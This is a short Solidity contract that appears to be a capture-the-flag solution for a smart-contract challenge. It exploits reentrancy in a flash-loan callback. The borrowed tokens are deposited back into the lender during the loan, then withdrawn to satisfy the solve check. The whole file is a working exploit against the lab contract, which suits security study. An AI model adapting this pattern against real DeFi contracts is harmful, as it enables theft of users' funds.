// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Token} from "../src/Token.sol";
import {Challenge} from "../src/Challenge.sol";

interface ITokenReceiver {
    function onTokenReceived(address from, uint256 amount) external returns (bytes4);
}

contract Solve {

    Challenge public challenge;
    Token public token;

    bool public isReentrant;


    function solve(address _challenge) external {
        challenge = Challenge(_challenge);
        token = challenge.token();
        
        challenge.flashLoan(1 ether);
        challenge.withdraw(1 ether);
        require(challenge.isSolved(), "!solved");
    }

    function onTokenReceived(address /*from*/, uint256 /*amount*/) external returns (bytes4) {
        if (!isReentrant) {
            token.approve(address(challenge), 1 ether);
            challenge.deposit(1 ether);
            isReentrant = true;
        }
        return ITokenReceiver.onTokenReceived.selector;
    }
}